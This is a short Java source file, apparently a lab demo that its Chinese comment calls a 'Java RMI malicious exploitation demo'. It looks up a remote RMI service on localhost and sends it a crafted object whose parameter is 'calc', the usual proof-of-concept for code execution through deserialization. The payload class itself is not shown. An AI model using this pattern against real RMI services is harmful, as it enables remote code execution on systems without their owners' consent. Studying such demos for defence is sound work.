package rmi1;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
   public class RMIClient {
       /**
        * Java RMI恶意利用demo
        *
        * @param args
        * @throws Exception
        */
       public static void main(String[] args) throws Exception {

           Registry registry = LocateRegistry.getRegistry();
           // 获取远程对象的引用
           Services services =(Services) Naming.lookup("rmi://127.0.0.1:9999/Services");
          // Services services = (Services) registry.lookup("rmi://127.0.0.1:9999/Services");
           PublicKnown malicious = new PublicKnown();
           malicious.setParam("calc");
           malicious.setMessage("haha");

           // 使用远程对象的引用调用对应的方法
           System.out.println(services.sendMessage(malicious));
       }
   }